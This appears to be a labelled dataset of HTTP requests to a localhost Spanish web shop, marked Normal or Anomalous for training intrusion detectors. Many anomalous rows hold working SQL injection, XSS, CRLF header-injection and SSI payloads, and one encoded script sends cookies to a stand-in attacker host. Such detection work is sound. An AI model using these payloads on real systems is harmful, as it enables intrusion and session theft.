raw_log,classification
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=doerr&password=8osqu85a7&nombre=Remy&apellidos=Torrado+G%E1llego&email=akadeth_svojtka%40privatebanking.com.pe%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=98300353D&direccion=Calle+Equador+86%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=17001&provincia=Burgos&ntc=9853640605253421&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vasiliad&password=E8COp762R&nombre=Gilberto&apellidos=Brzozowski&email=novis%40cementoscalibra.gy&dni=69084830Y&direccion=Av.+Del+Cantabrico+121%2C+2%3FB&ciudad=Bergondo&cpA=10135&provincia=Lleida&ntc=7240523818698482&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%257C HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/.INC HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.gif/.OLD HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=dezoete&password=dichoso&nombre=Alenka&apellidos=Ca%F1averal&email=kim%40donkr.yu&dni=08175127F&direccion=Callejon+Gallo+170%2C+11D&ciudad=Baral*la&cp=09592&provincia=Guadalajara&ntc=9286021613970339&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=79&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=vries&password=setabITAnO&nombre=Ido&apellidos=Cherino+Gebhardt&email=sauvanelex%40gaudio.lk&dni=53424203X&direccion=Calle+Sergio+Luna%2C+S%2FN+11G&ciudad=Muro+de+Aguas&cp=44141&provincia=C%F3rdoba&ntc=4787579213279770&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=defalco&password=botonesSet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Suyai&apellidos=R%E1bago+Patraca&email=ghenaiem_berlin%40hipotecascom.je&dni=24778234N&direccion=C%2F+La+Salpa+104%2C+&ciudad=Moral+de+la+Reina&cp=10334&provincia=Burgos&ntc=5823821605242067&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=baziuk4&password=8ro4&nombre=Bertolda&apellidos=Baldivieso&email=pavan%40phd-photodecor.in&dni=66883027Q&direccion=Calle+Costa+Brava%2C+148%2C+&ciudad=Villaeles+de+Valdavia&cp=24226&provincia=Zaragoza&ntc=6243309452199598&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=12&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=charko&password=entrevenimiento&nombre=Cayetano&apellidos=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&email=ruehmann.goodrow%40cajucar.bz&dni=75246757A&direccion=C%2F+Sierra+Maigmo%2C+S%2FN%2C+1%3FD&ciudad=Villa+de+Ves&cp=09343&provincia=Guadalajara&ntc=1828745224462815&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=4658&B1=Pasar+por+caja,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=1517&B1=Pasar+por+caja%2F,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dormer&pwd=sA6v682iA&remember=off&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=AND+1%3D1&precio=39&cantidad=23&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27+AND+%271%27%3D%271 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%2F%3Fma%2Crlo&pwd=col2g3e&remember=off&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=duffy&password=acabADameNte&nombre=Tali&apellidos=N%E1rez+Muriscot&email=vanity%40espaciodelpintor.kn&dni=88102583W&direccion=Albadalejo+Hijuela+76%2C+&ciudad=Lomoviejo&cp=09247&provincia=Barcelona&ntc=2777667912628191&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=suilin&password=654261ITU2A&nombre=Ailsa&apellidos=Llens+Capmany&email=fleugel%40tantomontamontatanto.lc&dni=31564707J&direccion=Glorieta+Liquidambar%2C+S%2FN%2C+13%3FF&ciudad=Puebla+del+Salvador&cp=24438&provincia=Huelva&ntc=2227850098385549&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/salir.jsp/6909030637832563290.jsp HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1437&B1=Pasar+por+caja HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/asf-logo-wide.gif HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Jam%F3n+Ib%E9rico&precioA=85&cantidad=6&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=velasque9&pwd=adversario&remember=on&B1=Entrar,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=gantt&password=sae19r8&nombre=Libe&apellidos=Amusquivar&email=mccormack%40neotelecom.tn&dni=35453403F&direccion=Calle+Tamarindo%2C+118+&ciudad=Cabre%3Fros*+del+Monte&cp=25400&provincia=Madrid&ntc=5272129392938090&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=yihban&pwd=04or2ativ1&remember=off&B1=Entrar,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Queso+Manchego&precio=85&cantidadA=31&B1=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Vino+Rioja&precio=39&cantidad=61&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.bak HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1972&B1=Pasar+por+caja HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6543&B1A=Confirmar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=280&B1=Pasar+por+caja,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp/6909030637832563290.jsp HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=90&B1=A%F1adir+al+carrito,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&login=alexi&password=cUerdA&nombre=Donardo&apellidos=Paracoll&email=filho%40encuentrodominios.is&dni=01722111D&direccion=Enric+Granados+137%2C+&ciudad=Ruesca&cp=47248&provincia=Alicante&ntc=0825150389138142&B1=Registrar,Anomalous
GET http://localhost:8080/asf-logo-wide HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ashlin&password=B3zUcAR&nombre=Miles&apellidos=Henriquez+Femenias&email=kaidanovsky%40soybueno.lt&dni=58725277K&direccion=C%2F+Juan+De+Bustamante%2C+30%2C+10B&ciudad=Pozal+de+Gallinas&cp=06173&provincia=Toledo&ntc=8879069271917222&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=709&B1A=Pasar+por+caja,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=quinn&pwd=incisivo&remember=off&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=mullinix&password=portadguero&nombre=Nanda&apellidos=Santagata+Pillajo&email=wakasa%40miami-beach.gf&dni=44636251J&direccion=C%2F+Perro+De+San+Cecilio%2C+197+11%3FA&ciudad=Cerro+de+And%E9valo%2C+El&cp=19275&provincia=Guadalaja%2Fra&ntc=5604259372572557&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=1633&B1=Confirmar%27INJECTED_PARAM,Anomalous
GET http://localhost:8080/6909030637832563290.jsp HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=wenham&password=coNdE2s80TE&nombre=Valeria&apellidos=Valero+Tolaba&email=goldner-gadsdon%40candidaturaolle-futuronotarial.eu&dni=66020343Q&direccion=Plza.+Altozano+72%2C+&ciudad=Tragacete&cp=16639&provincia=Burgos&ntc=0271947450207950&B1A=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=3&nombre=Queso+Manchego&precio=39&cantidad=21&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kinnaird&password=9r2sta1o191a&nombre=Nadra&apellidos=Taronger&email=moriarity%40centralitatelefonicavirtual.bn&dni=97649616B&direccion=112+26%2C+2F&ciudad=Mogarraz&cp=34247&provincia=Valencia&ntcA=2104962244988688&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Vino+Rioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito%2520,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=sturrock&pwd=60509etr4&remember=off%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goei&passwordA=solemnemente&nombre=Juvencio&apellidos=Sebastan+Bastida&email=luu-tupou%40eddydaniele.bj&dni=77050984H&direccion=Avinguda+Lluis+Companys%2C+144+3-D&ciudad=Mu%F1osancho&cp=37871&provincia=Valencia&ntc=4809346017466536&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=pr*atap&password=anafrodisia&nombre=Melit%F3n&apellidos=Cornell+Alumbrer&email=irawan_hightower%40salsaspain.an&dni=86251880V&direccion=Calle+Javier+Puig%2C+104%2C+&ciudad=Villar+del+Cobo&cp=37256&provincia=Burgos&ntc=3418177143223897&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=fitness&password=tripicallero&nombre=Mar%EDa&apellidos=Lesaca+Clar%E0&email=nixon%40chinavende.bw&dni=99631010R&direccion=Torrent+De+Can+Besora%2C+68+&ciudad=Higuera&cp=42141&provincia=C%F3rdoba&ntc=4809909158427521&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5540&B1=Confirmar%2F HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=39&cantidad=84&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/iissamples/ExAir/FunNGames/FunNGames.asp HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=rygwalsk&password=ve50able&nombre=Francisco&apellidos=Pallares+Milara%2500&email=gozzi%40encuentrodominios.at&dni=51556666G&direccion=Pl.+Banco+196%2C+7G&ciudad=Corrales&cp=03187&provincia=La+Rioja&ntc=3169451354292215&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chueh5&pwd=%C137cE&remember=on&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080http://localhost:9090/examplesWebApp/OrderParser.jsp?xmlfile=C:/bea/weblogic81/samples/server/examples/src/examples/xml/orderParser/order.xml HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modoA=entrar&login=vivianne7&pwd=adu3%F3n&remember=on&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/publico/6909030637832563290.jsp HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.gif/.Bak HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=que%27rida&password=s18i7re&nombre=Idalina&apellidos=Carcanoux&email=fujioka%40importaproductosespa%F1oles.in&dni=06317568C&direccion=Victor+Zurita+Soler%2C+8+9%3FB&ciudad=Puebla+de+Cazalla%2C+La&cp=49220&provincia=Ja%E9n&ntc=8222633485152757&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9140&B1=Pasar+por+caja HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=+ HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=8145&B1=Confirmar,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080.Bak HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=torsten&password=quienq%21uier&nombre=Ceciliano&apellidos=De+la+Llave+Graell&email=tambor%40archivodeimagenes.mu&dni=79001087C&direccion=C%2F+Recanto+Da+Mapoula+87+8%3FA&ciudad=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=33610&provincia=Madrid&ntc=3747055026532862&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=586&B1=Confirmar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/ HTTP/1.1,Anomalous
GET http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=58&B1=A%F1adir+al+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=sienggo&password=6121cu5g%E9*7449&nombre=Jer%F3nimo&apellidos=Carretto+Morgadas&email=magelis.kember%40cirujanaplastica.nc&dni=22646510C&direccion=Plaza+San+Jorge%2C+S%2FN%2C+2%3FH&ciudad=Mariana&cp=15807&provincia=Palencia&ntc=798769257812246A&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=78&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp.Inc HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Set-cookie%253A%2BTamper%253D1041264011025374727,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=4021&B1=Confirmar,Anomalous
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=shangtia&password=cogotillo&nombre=Tarsila&apellidos=Azc%E1rate+Campalan&email=millot_power%40guejos.sv&dni=19277401C&direccion=Calle+Maria+Marin%2C+196%2C+&ciudad=Veracruz&cp=46724&provincia=Navarra&ntc=5828720454408977&B1=Registrar,Normal
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=racette&password=j804n86O&nombre=Gino&apellidos=Puy&email=borgeaud%40enmenorca.com.om&dni=52984297W&direccion=Jabeque%2C+86%2C+&ciudad=Relleu&cp=45810&provincia=%C1vila&ntc=9280522239849881&B1=Registrar,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=9366&B1=Pasar+por+caja,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=kempler7&password=E517a%24D%F37&nombre=Queila&apellidos=Canut+Escriba&email=morishige-tombes%40quierocortinas.do&dni=64526656H&direccion=Calle+Castropol+11+&ciudad=Salillas+de+Jal%F3n&cp=32430&provincia=%C1vila&ntc=3764289357675438&B1=Registrar,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=betty-an5&password=mo9qu0aDO&nombre=Petunia&apellidos=Ivern&email=veazie-bolin%40tiaherminia.tj&dni=32245892F&direccion=Calle+Luis+Piernas+86+11-E&ciudad=Gerindote&cp=46443&provincia=Almer%EDa&ntc=8173244424971818&B1=Registrar%2500 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=%27%2Cb%27rieda&pwd=ric8Me6te&remember=on&B1=Entrar,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%7C,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Queso+Manchego&precioA=39&cantidad=94&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=melisse&pwd=pleit%E9s&remember=onAND+1%3D1&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=saladna&password=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Amranto&apellidos=Enjuanes+Corbi&email=tin%40velazquezlarra%F1aga.aw&dni=09894897K&direccion=C%2F+358+180+13%3FG&ciudad=Sanl%FAcar+de+Barrameda&cp=16118&provincia=Cuenca&ntc=1923588691952780&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7427&B1=Confirmar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provincia=Barcelona%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=5124736256894307&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,Normal
